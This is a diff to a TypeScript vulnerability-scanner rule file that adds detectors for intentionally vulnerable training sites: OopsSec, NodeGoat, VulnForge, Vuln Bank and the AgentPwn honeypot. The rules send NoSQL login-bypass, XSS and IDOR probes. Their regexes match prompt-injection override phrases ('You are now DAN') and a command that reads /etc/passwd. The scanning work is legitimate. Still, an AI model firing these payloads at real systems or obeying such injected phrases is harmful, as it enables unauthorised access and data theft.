@@ -5,6 +5,7 @@
 // (idorProbe, clientOnlyAuth, serverActionAuthz) intentionally do not run on the free path;
 // they exist so the worker / future deep flow can share the same registry keys.
 
+import { createHmac } from "crypto";
 import {
   thugirJwtClaims,
   thugirJsEndpoints,
@@ -41,6 +42,7 @@ import {
   isConvexOpenQueryResponse,
   isLikelyConvexQueryPath,
   buildAlgNoneJwt,
+  buildHs256Jwt,
   looksAuthChallenge,
   looksAuthGatedJson,
   ADMIN_PANEL_PATHS,
@@ -49,6 +51,7 @@ import {
   redirectedToLogin,
   isSameSpaShell
 } from "./helpers";
+import { decodeJwt } from "./crypto-tools";
 
 export interface RuleContext {
   origin: string;
@@ -5799,6 +5802,82 @@ const clientSideOopssecXffSqliEvidence: Rule = async (ctx) => {
   };
 };
 
+const oopssecXffSqliRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/posts\/x-forwarded-for-sql-injection/i.test(pageUrl)) return NEGATIVE;
+  const result = await clientSideOopssecXffSqliEvidence(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "OopsSec Store /posts/x-forwarded-for-sql-injection route scan — walkthrough documents SQLi via unsanitized X-Forwarded-For header in /api/tracking IP query"
+    }
+  };
+};
+
+// --- OopsSec Store live-stream BFLA walkthrough (posts/live-stream-hijack) ------------
+const CLIENT_OOPSSEC_LIVE_STREAM_RES: { label: string; re: RegExp }[] = [
+  {
+    label: "Live stream hijack BFLA title",
+    re: /Broken Function Level Authorization:[\s\S]{0,80}Hijacking the Live Stream/i
+  },
+  {
+    label: "Unprotected GET/POST /api/live/stream",
+    re: /GET \/api\/live\/stream[\s\S]{0,200}POST \/api\/live\/stream/i
+  },
+  {
+    label: "RTMP stream key exposure to any authenticated user",
+    re: /RTMP ingest URL and stream key[\s\S]{0,120}any authenticated user/i
+  },
+  {
+    label: "Admin-only UI with no server-side role check",
+    re: /admin-only write endpoint that never checks your role|API behind it never checks your role/i
+  },
+  {
+    label: "Challenge 07 live stream hijack walkthrough",
+    re: /Challenge 0?7[\s\S]{0,40}live[\s-]?stream|\/posts\/live-stream-hijack/i
+  }
+];
+
+const clientSideOopssecLiveStreamEvidence: Rule = async (ctx) => {
+  const pageUrl = ctx.home.finalUrl || ctx.scanUrl || ctx.origin;
+  if (!/oss-oopssec-store|koadt\.github\.io/i.test(pageUrl)) return NEGATIVE;
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_OOPSSEC_LIVE_STREAM_RES) {
+    const m = ctx.combined.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  if (!/OopsSec Store|live stream|\/api\/live\/stream/i.test(ctx.combined)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.91 : 0.88,
+    evidence: {
+      markers: hits.slice(0, 4),
+      note: "OopsSec Store walkthrough documents BFLA on /api/live/stream — any authenticated user can read RTMP keys and hijack the public broadcast"
+    }
+  };
+};
+
+const oopssecLiveStreamBflaRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/posts\/live-stream-hijack/i.test(pageUrl)) return NEGATIVE;
+  const result = await clientSideOopssecLiveStreamEvidence(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "OopsSec Store /posts/live-stream-hijack route scan — walkthrough documents unprotected GET/POST /api/live/stream BFLA with RTMP stream key exposure"
+    }
+  };
+};
+
 // --- VoidSec Shopping Cart hack-lab landing (voidsec.github.io/shopping-cart) ---------
 const CLIENT_VOIDSEC_SHOPPING_CART_RES: { label: string; re: RegExp }[] = [
   {
@@ -6356,6 +6435,856 @@ const clientSideNodegoatEvidence: Rule = async (ctx) => {
     evidence: {
       markers: hits.slice(0, 4),
       note: "OWASP NodeGoat is an intentionally insecure Node.js training application with tutorial labs for injection, auth, and NoSQL flaws"
+    }
+  };
+};
+
+function isNodegoatHost(ctx: RuleContext): boolean {
+  return /nodegoat-websec\.herokuapp\.com/i.test(ctx.origin);
+}
+
+async function nodegoatTutorialMarkers(
+  ctx: RuleContext,
+  tutorialSlug: string,
+  markers: { label: string; re: RegExp }[],
+  note: string
+): Promise<RuleResult> {
+  const canonicalUrl = new URL(`/tutorial/${tutorialSlug}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(canonicalUrl, { maxBytes: 65536, timeoutMs: 20000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of markers) {
+    const m = doc.body.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.92 : 0.9,
+    evidence: {
+      canonicalUrl,
+      markers: hits.slice(0, 4),
+      snippet: hits[0]?.sample,
+      note
+    }
+  };
+}
+
+const nodegoatTutorialA2RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a2\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a2", [
+    {
+      label: "A2 broken auth tutorial title",
+      re: /A2-Broken Authentication and Session Management|Broken Authentication/i
+    },
+    { label: "Session management walkthrough", re: /Session Management|Session Fixation/i },
+    { label: "Brute force / password reset topics", re: /brute force|password reset/i }
+  ], "NodeGoat /tutorial/a2 documents broken authentication and session management training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA3RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a3\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a3", [
+    {
+      label: "A3 XSS tutorial title",
+      re: /A3-Cross-Site Scripting \(XSS\)|Cross-Site Scripting \(XSS\)/i
+    },
+    { label: "Reflected/stored XSS walkthrough", re: /Reflected XSS|Stored XSS|DOM\s+based XSS/i },
+    { label: "Output encoding mitigation guidance", re: /output encoding|Input validation and sanitization/i }
+  ], "NodeGoat /tutorial/a3 documents cross-site scripting (reflected/stored/DOM) training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA1RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a1\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a1", [
+    { label: "A1 injection tutorial title", re: /A1\s*-\s*Injection|A1 Injection/i },
+    {
+      label: "Server-side JS injection walkthrough",
+      re: /Server Side JS Injection|SSJS Injection|ServerSide JavaScript Injection/i
+    },
+    { label: "NoSQL / eval injection topics", re: /NoSQL|eval\(|interpreter into executing unintended commands/i }
+  ], "NodeGoat /tutorial/a1 documents injection (server-side JS/NoSQL) training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA4RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a4\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a4", [
+    {
+      label: "A4 insecure direct object reference title",
+      re: /A4\s*-\s*Insecure Direct Object|A4 Insecure DOR|Insecure Direct Object References/i
+    },
+    {
+      label: "Direct object reference walkthrough",
+      re: /direct object references?|Insecure Direct Object/i
+    },
+    { label: "Unauthorized access topics", re: /accessing data without proper authorization|unauthorized access/i }
+  ], "NodeGoat /tutorial/a4 documents insecure direct object reference (IDOR) training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA5RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a5\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a5", [
+    {
+      label: "A5 security misconfiguration title",
+      re: /A5-Security Misconfiguration|A5 Misconfig/i
+    },
+    {
+      label: "Stack-level misconfiguration walkthrough",
+      re: /Security misconfiguration can happen at any level|web server, application server, database/i
+    },
+    {
+      label: "Privileged runtime / header leak topics",
+      re: /run application with root privileges|leak internal implementation details via cookie names/i
+    }
+  ], "NodeGoat /tutorial/a5 documents security misconfiguration training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA6RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a6\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a6", [
+    {
+      label: "A6 sensitive data exposure title",
+      re: /A6-Sensitive Data Exposure|A6 Sensitive Data/i
+    },
+    {
+      label: "Sensitive data protection walkthrough",
+      re: /access sensitive data such as credit cards|encryption at rest or in transit/i
+    },
+    {
+      label: "Weak encryption / database theft topics",
+      re: /steal the sensitive information not encrypted|Encrypt all sensitive data at rest/i
+    }
+  ], "NodeGoat /tutorial/a6 documents sensitive data exposure training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA7RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a7\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a7", [
+    {
+      label: "A7 missing function level access control title",
+      re: /A7-Missing Function Level Access Control|A7 Access Controls/i
+    },
+    {
+      label: "Server-side authorization walkthrough",
+      re: /perform the same access control checks on the server|verify function level access rights/i
+    },
+    {
+      label: "Benefits module bypass topics",
+      re: /forge requests in order to access functionality without proper authorization|benefits module/i
+    }
+  ], "NodeGoat /tutorial/a7 documents missing function-level access control training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA8RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a8\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a8", [
+    {
+      label: "A8 CSRF tutorial title",
+      re: /A8-Cross-Site Request Forgery \(CSRF\)|A8[\s-]+CSRF/i
+    },
+    {
+      label: "CSRF forged-request walkthrough",
+      re: /CSRF attack forces a logged-on victim|forged HTTP request/i
+    },
+    {
+      label: "Profile form CSRF exploit topics",
+      re: /CSRF vulnerability can be exploited on profile form|host a forged form/i
+    }
+  ], "NodeGoat /tutorial/a8 documents cross-site request forgery training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const nodegoatTutorialA9RouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tutorial\/a9\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await nodegoatTutorialMarkers(ctx, "a9", [
+    {
+      label: "A9 insecure components tutorial title",
+      re: /A9-Using Components with Known Vulnerabilities|A9[\s-]+Insecure Components/i
+    },
+    {
+      label: "Vulnerable dependency walkthrough",
+      re: /Components, such as libraries, frameworks|vulnerable component is exploited/i
+    },
+    {
+      label: "Marked library XSS scenario",
+      re: /insecure version of the Marked library|Marked library isn't filtering very well|vulnerable to XSS exploits/i
+    }
+  ], "NodeGoat /tutorial/a9 documents using components with known vulnerabilities (Marked library XSS) training content");
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+function nodegoatSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^connect\.sid=/i.test(c))?.split(";")[0] ?? null;
+}
+
+async function nodegoatRegisterSessionCookie(ctx: RuleContext): Promise<string | null> {
+  const userName = `thugir_ng_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const signupUrl = new URL("/signup", ctx.origin).toString();
+  const signupPage = await ctx.probe.get(signupUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  const csrfMatch = signupPage.body.match(/name="_csrf"\s+value="([^"]*)"/i);
+  const csrf = csrfMatch?.[1] ?? "";
+  const registerDoc = await ctx.probe.get(signupUrl, {
+    method: "POST",
+    body: `userName=${encodeURIComponent(userName)}&firstName=Thugir&lastName=Probe&password=ThugirTest123!&verify=ThugirTest123!&email=${encodeURIComponent(`${userName}@probe.local`)}&_csrf=${encodeURIComponent(csrf)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const registerCookie = nodegoatSessionCookieFromDoc(registerDoc);
+  if (!registerCookie) return null;
+  const loginDoc = await ctx.probe.get(new URL("/login", ctx.origin).toString(), {
+    method: "POST",
+    body: `userName=${encodeURIComponent(userName)}&password=ThugirTest123!`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: registerCookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const location = loginDoc.headers["location"] || "";
+  if ([301, 302, 303, 307, 308].includes(loginDoc.status) && location && !/login/i.test(location)) {
+    return nodegoatSessionCookieFromDoc(loginDoc) ?? registerCookie;
+  }
+  return registerCookie;
+}
+
+async function nodegoatNosqlLoginCookie(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const payloads = [
+    "userName[$gt]=&password[$gt]=",
+    `userName=${encodeURIComponent('{"$gt":""}')}&password=${encodeURIComponent('{"$gt":""}')}`
+  ];
+  for (const body of payloads) {
+    const doc = await ctx.probe.get(loginUrl, {
+      method: "POST",
+      body,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    const location = doc.headers["location"] || "";
+    if ([301, 302, 303, 307, 308].includes(doc.status) && location && !/login/i.test(location)) {
+      return nodegoatSessionCookieFromDoc(doc);
+    }
+  }
+  return null;
+}
+
+async function nodegoatBenefitsNosqlLiveProbe(ctx: RuleContext): Promise<RuleResult> {
+  let cookie = await nodegoatNosqlLoginCookie(ctx);
+  if (!cookie) cookie = await nodegoatRegisterSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const allocationsUrl = new URL("/allocations/2", ctx.origin);
+  allocationsUrl.searchParams.set("threshold", "0");
+  const allocDoc = await ctx.probe.get(allocationsUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (allocDoc.status < 200 || allocDoc.status >= 400) return NEGATIVE;
+  const idorOk =
+    /allocations/i.test(allocDoc.body) &&
+    (/stocks/i.test(allocDoc.body) || /bonds/i.test(allocDoc.body) || /funds/i.test(allocDoc.body));
+  if (!idorOk) return NEGATIVE;
+  const nosqlUrl = new URL("/allocations/1", ctx.origin);
+  nosqlUrl.searchParams.set("threshold", "0");
+  const nosqlDoc = await ctx.probe.get(nosqlUrl.toString(), {
+    maxBytes: 65536,
+    timeoutMs: 20000,
+    headers: { Cookie: cookie }
+  });
+  const thresholdBypass =
+    nosqlDoc.status >= 200 &&
+    nosqlDoc.status < 400 &&
+    /stocks/i.test(nosqlDoc.body) &&
+    /threshold/i.test(nosqlDoc.body);
+  return {
+    fired: true,
+    confidence: thresholdBypass ? 0.93 : 0.9,
+    evidence: {
+      allocationsUrl: allocationsUrl.toString(),
+      nosqlUrl: nosqlUrl.toString(),
+      snippet: allocDoc.body.slice(0, 200).trim(),
+      thresholdBypass,
+      note: thresholdBypass
+        ? "NodeGoat GET /allocations/:userId?threshold= accepts unsanitized threshold in $where clause — NoSQL injection oracle (benefits/allocations family)"
+        : "NodeGoat GET /allocations/2 returns another user's allocation data without ownership check — IDOR oracle on allocations API"
+    }
+  };
+}
+
+const nodegoatBenefitsNosqlRouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/benefits\b/i.test(pageUrl)) return NEGATIVE;
+  const benefitsUrl = new URL("/benefits", ctx.origin).toString();
+  const benefitsDoc = await ctx.probe.get(benefitsUrl, {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    redirect: "follow"
+  });
+  const benefitsMarkers: { label: string; sample: string }[] = [];
+  const markerRes: { label: string; re: RegExp }[] = [
+    { label: "RetireEasy benefits module", re: /Retire[\s\S]{0,12}Easy|Employee Retirement Savings/i },
+    { label: "benefits start date form", re: /benefit(?:StartDate|sDate)|name=["']benefitsDate["']/i },
+    { label: "benefits POST endpoint", re: /POST\s*\/benefits|action=["']\/benefits/i }
+  ];
+  for (const { label, re } of markerRes) {
+    const m = benefitsDoc.body.match(re);
+    if (m) benefitsMarkers.push({ label, sample: m[0].slice(0, 100) });
+  }
+  const nosqlHits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_NOSQL_RES) {
+    const m = ctx.combined.match(re);
+    if (m) nosqlHits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  const nodegoatNosqlRes: { label: string; re: RegExp }[] = [
+    { label: "MongoDB $gt password bypass payload", re: /"password"\s*:\s*\{\s*\$gt\s*:\s*""\s*\}/i },
+    { label: "allocations threshold $where injection", re: /allocations[\s\S]{0,200}\$where|threshold[\s\S]{0,120}\$where/i },
+    { label: "db.accounts.find NoSQL login", re: /db\.accounts\.find\s*\(\s*\{[\s\S]{0,80}password/i }
+  ];
+  for (const { label, re } of nodegoatNosqlRes) {
+    const m = ctx.combined.match(re);
+    if (m) nosqlHits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  const live = await nodegoatBenefitsNosqlLiveProbe(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: { ...live.evidence, scannedUrl: pageUrl, benefitsUrl, benefitsMarkers: benefitsMarkers.slice(0, 3) }
+    };
+  }
+  if (benefitsMarkers.length < 1 || nosqlHits.length < 1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: benefitsMarkers.length >= 2 ? 0.9 : 0.87,
+    evidence: {
+      scannedUrl: pageUrl,
+      benefitsUrl,
+      benefitsMarkers: benefitsMarkers.slice(0, 3),
+      nosqlMarkers: nosqlHits.slice(0, 3),
+      note: "NodeGoat /benefits route scan — RetireEasy benefits module with client-documented MongoDB $gt/$ne NoSQL injection patterns (allocations threshold / login bypass family)"
+    }
+  };
+};
+
+function isAgentpwnHost(ctx: RuleContext): boolean {
+  return /agentpwn\.com/i.test(`${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`);
+}
+
+function isVulnforgeAcademyHost(ctx: RuleContext): boolean {
+  return /vulnforge-academy\.vercel\.app/i.test(ctx.origin);
+}
+
+function vulnforgeAcademyLevelFromUrl(url: string): number | null {
+  const m = url.match(/level(\d+)\.php/i);
+  return m ? Number(m[1]) : null;
+}
+
+const VULNFORGE_XSS_PROBE = "thugirVulnforgeXssProbe";
+const VULNFORGE_DOM_XSS_ATTR = '" onload="thugirVulnforgeDomProbe"';
+
+const vulnforgeAcademyLevelSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnforgeAcademyHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/levels\/[^/]+\/level\d+\.php/i.test(pageUrl)) return NEGATIVE;
+  const levelNum = vulnforgeAcademyLevelFromUrl(pageUrl);
+  if (levelNum !== null && levelNum >= 4) return NEGATIVE;
+  const sqlHit = await sqlErrorDisclosure(ctx);
+  if (!sqlHit.fired) return NEGATIVE;
+  const hitUrl = String(sqlHit.evidence?.url ?? "");
+  if (!/\/api\/portal/i.test(hitUrl) && !/\/level\d+\.php/i.test(hitUrl)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: sqlHit.confidence,
+    evidence: {
+      ...sqlHit.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnForge Academy level route scan — /api/portal (or level) search parameter returns SQL syntax error disclosure"
+    }
+  };
+};
+
+const vulnforgeAcademyLevelXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnforgeAcademyHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/levels\/[^/]+\/level\d+\.php/i.test(pageUrl)) return NEGATIVE;
+  const levelNum = vulnforgeAcademyLevelFromUrl(pageUrl);
+  if (levelNum === null || levelNum < 4 || levelNum > 6) return NEGATIVE;
+  const domLevel = levelNum === 6;
+  const paramSets = domLevel
+    ? [
+        { param: "name", payload: VULNFORGE_DOM_XSS_ATTR },
+        { param: "search", payload: VULNFORGE_DOM_XSS_ATTR },
+        { param: "q", payload: VULNFORGE_DOM_XSS_ATTR }
+      ]
+    : [
+        { param: "name", payload: `<script>${VULNFORGE_XSS_PROBE}</script>` },
+        { param: "search", payload: `<script>${VULNFORGE_XSS_PROBE}</script>` },
+        { param: "comment", payload: `<script>${VULNFORGE_XSS_PROBE}</script>` },
+        { param: "message", payload: `<script>${VULNFORGE_XSS_PROBE}</script>` }
+      ];
+  for (const { param, payload } of paramSets) {
+    const probeUrl = new URL(pageUrl, ctx.origin);
+    probeUrl.searchParams.set(param, payload);
+    const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    if (domLevel) {
+      if (
+        /onload\s*=\s*["']thugirVulnforgeDomProbe/i.test(doc.body) &&
+        /document\.write|location\.search/i.test(doc.body)
+      ) {
+        return {
+          fired: true,
+          confidence: 0.92,
+          evidence: {
+            scannedUrl: pageUrl,
+            url: probeUrl.toString(),
+            level: levelNum,
+            snippet: doc.body.slice(0, 240).trim(),
+            note: `VulnForge Academy level ${levelNum} route scan — ${param} query injects into document.write/location.search DOM XSS sink`
+          }
+        };
+      }
+      continue;
+    }
+    if (new RegExp(VULNFORGE_XSS_PROBE, "i").test(doc.body)) {
+      return {
+        fired: true,
+        confidence: 0.91,
+        evidence: {
+          scannedUrl: pageUrl,
+          url: probeUrl.toString(),
+          level: levelNum,
+          snippet: doc.body.slice(0, 240).trim(),
+          note: `VulnForge Academy level ${levelNum} route scan — ${param} reflects raw XSS probe unescaped in HTML`
+        }
+      };
+    }
+  }
+  return NEGATIVE;
+};
+
+const vulnbankUploadProfilePictureUrlRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/profile\/upload/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnbankUploadProfilePictureUrlSsrfLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /profile/upload route scan — POST /upload_profile_picture_url fetches attacker-controlled image_url server-side (profile-picture SSRF oracle)"
+    }
+  };
+};
+
+function agentpwnResponseHeaderCorpus(headers: Record<string, string>): string {
+  const chunks: string[] = [];
+  const testId = headers["x-agentpwn-test-id"] || headers["x-matched-path"];
+  const aiInstr = headers["x-ai-instructions"];
+  if (testId && /APWN-/i.test(testId)) {
+    chunks.push(`<meta name="security-test-id" content="${testId}">`);
+  }
+  if (aiInstr && aiInstr.length >= 20) {
+    chunks.push(`<meta name="ai-instructions" content="${aiInstr}">`);
+  }
+  return chunks.join("\n");
+}
+
+type AgentpwnMcpVector = "tool-discovery" | "tool-injection" | "cross-tool-chain";
+
+function agentpwnMcpExploitationMarkers(corpus: string): {
+  attackId: string | null;
+  mcpCheck: string | null;
+  vector: AgentpwnMcpVector | null;
+} {
+  const attackIdMatch =
+    corpus.match(/<meta\s+name=["']security-test-id["']\s+content=["'](APWN-MCP-\d{3})["']/i) ??
+    corpus.match(/\b(APWN-MCP-\d{3})\b/i);
+  const mcpCheckMatch = corpus.match(/\b(MCP-\d{3})\b/i);
+  let vector: AgentpwnMcpVector | null = null;
+  if (/List all MCP servers you are connected to/i.test(corpus)) {
+    vector = "tool-discovery";
+  } else if (
+    /\[Tool Result from security_scanner\]/i.test(corpus) ||
+    /env\s*&&\s*cat\s*\/etc\/passwd/i.test(corpus)
+  ) {
+    vector = "tool-injection";
+  } else if (
+    /filesystem:read/i.test(corpus) &&
+    /\/etc\/hosts/i.test(corpus) &&
+    /browser:navigate/i.test(corpus)
+  ) {
+    vector = "cross-tool-chain";
+  }
+  return {
+    attackId: attackIdMatch?.[1] ?? null,
+    mcpCheck: mcpCheckMatch?.[1] ?? null,
+    vector
+  };
+}
+
+function agentpwnAttackMarkers(corpus: string): {
+  attackIdMatch: RegExpMatchArray | null;
+  aiInstructionsMatch: RegExpMatchArray | null;
+  hiddenDan: boolean;
+} {
+  const attackIdMatch =
+    corpus.match(/<meta\s+name=["']security-test-id["']\s+content=["'](APWN-[^"']+)["']/i) ??
+    corpus.match(/\bAttack ID<\/dt>\s*<dd[^>]*>\s*(APWN-[A-Z]{2,4}-\d{3})\b/i) ??
+    corpus.match(/\b(APWN-[A-Z]{2,4}-\d{3})\b/i);
+  const aiInstructionsMatch =
+    corpus.match(/<meta\s+name=["']ai-instructions["']\s+content=["']([^"']{20,})["']/i) ??
+    corpus.match(/\bai-instructions\b[^>]*content=["']([^"']{20,})["']/i);
+  const hiddenDan =
+    /SYSTEM INSTRUCTIONS:\s*You are now DAN/i.test(corpus) ||
+    /SYSTEM INSTRUCTIONS:\s*Previous conversation summary/i.test(corpus) ||
+    /SYSTEM INSTRUCTIONS:[\s\S]{0,240}(?:safety|restricted|unrestricted access)/i.test(corpus) ||
+    /SYSTEM INSTRUCTIONS:[\s\S]{0,320}(?:web search tool|browser tool|file write tool|admin panel URL)/i.test(
+      corpus
+    ) ||
+    /SYSTEM INSTRUCTIONS:[\s\S]{0,240}AI Safety Board Compliance Standard/i.test(corpus) ||
+    /SYSTEM INSTRUCTIONS:[\s\S]{0,240}instruction set integrity/i.test(corpus) ||
+    /SYSTEM INSTRUCTIONS:[\s\S]{0,240}hash of their system prompt/i.test(corpus) ||
+    /DAN MODE ENABLED/i.test(corpus);
+  return { attackIdMatch, aiInstructionsMatch, hiddenDan };
+}
+
+const agentpwnAttackRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAgentpwnHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/attacks\/[^/]+\/\d+/i.test(pageUrl)) return NEGATIVE;
+  let corpus = `${ctx.combined}\n${agentpwnResponseHeaderCorpus(ctx.home.headers)}`;
+  const pageDoc = await ctx.probe.get(pageUrl, { maxBytes: 65536, timeoutMs: 18000 });
+  if (pageDoc.status >= 200 && pageDoc.status < 400) {
+    corpus = `${corpus}\n${pageDoc.body}\n${agentpwnResponseHeaderCorpus(pageDoc.headers)}`;
+  }
+  let { attackIdMatch, aiInstructionsMatch, hiddenDan } = agentpwnAttackMarkers(corpus);
+  const reportApi = /agentpwn\.com\/api\/report/i.test(corpus);
+  if (!attackIdMatch && !aiInstructionsMatch && !hiddenDan) return NEGATIVE;
+  const attackId = attackIdMatch?.[1];
+  const categoryMatch = pageUrl.match(/\/attacks\/([^/]+)\//i);
+  return {
+    fired: true,
+    confidence: attackId && aiInstructionsMatch ? 0.94 : 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      attackId,
+      category: categoryMatch?.[1],
+      aiInstructionsSample: aiInstructionsMatch?.[1]?.slice(0, 120),
+      reportApi,
+      note: "AgentPwn /attacks route scan — ai-instructions meta + off-screen SYSTEM INSTRUCTIONS smuggle jailbreak/prompt-injection payloads (APWN honeypot oracle)"
+    }
+  };
+};
+
